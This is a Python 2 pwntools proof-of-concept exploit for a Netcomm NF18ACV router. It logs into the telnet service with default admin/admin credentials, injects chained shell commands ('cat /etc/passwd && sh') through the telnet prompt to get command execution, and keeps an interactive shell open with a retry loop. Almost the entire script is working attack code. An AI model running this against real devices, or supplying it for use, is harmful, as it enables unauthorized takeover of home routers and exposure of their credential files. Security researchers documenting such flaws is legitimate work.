#python2
# pwntools for pw3 is still glitchy despite EOL,
# I guess I'll stick to py2 pwntools instead (Dec 2019)
from pwn import *
from time import sleep

MODEL = "NF18ACV" # for self-chk purposes only 

IP = "192.168.20.1"
PORT = 23 #telnet

# always-standard login pass :joy:
USERNAME = "admin"
PASSWORD = "admin"

# consts for script itself
PROMPT_TELNET = "> "
SHELL = "sh"
SHELL_SIGNATURE = "shell"

## or ";" instead of "&&". Also works. But not "||"
PAYLOAD_QUICK = "cat / ; "+SHELL 
PAYLOAD_SHOWOFF = "cat /etc/passwd && "+SHELL
io = remote(IP, PORT) 

# model header is always passed on Netcomm
buf = io.recvline()
assert(buf.find(MODEL) != -1) # self-chk, remove for performance

print("1: login")
io.recvuntil("Login: ")
io.sendline(USERNAME)
sleep(0.5)

print("2: pass")
io.recvuntil("Password: ")
io.sendline(PASSWORD)
sleep(0.5)

try:
	buf = io.recv()
	if(buf.find("incorrect") != -1):
		print("Somehow credentials are incorrect?")
		assert(False)
	elif(buf.find(PROMPT_TELNET) != -1):
		print("All good, logged in..")
	else:
		print("Not sure what happened. Check below")
		print(buf)
		assert(False)
		
	print("Now let's try for totally secure inner credentials, ")
	print("While trying for arbitrary code execution!")
	
	io.sendline(PAYLOAD_SHOWOFF)
	sleep(0.5)
	buf = io.recv()
	
	if(buf.find(SHELL_SIGNATURE) == -1):
		print("I guess no shell?")
		print(buf)
		assert(False)
	else:
		print("========================")
		print("Shell obtained successfully!")
		print("Now, shell is kind of unstable, and may randomly")
		print("glitch out into telnet script; hence:")
		print("1xCTRL+C to respring/retether the hack")
        print("2xCTRL+C / 1xCTRL+Z to exit")
		print("========================")
		print(buf)
		while(1):
			io.interactive(prompt = "")
			shell_screwed = 1
			while(shell_screwed):
				print("trying for shell...")
				io.sendline(PAYLOAD_QUICK)
				buf = io.recv()
				shell_screwed = (buf.find(SHELL_SIGNATURE) == -1)
				sleep(0.5)
				
	
except Exception as e:
	raise e

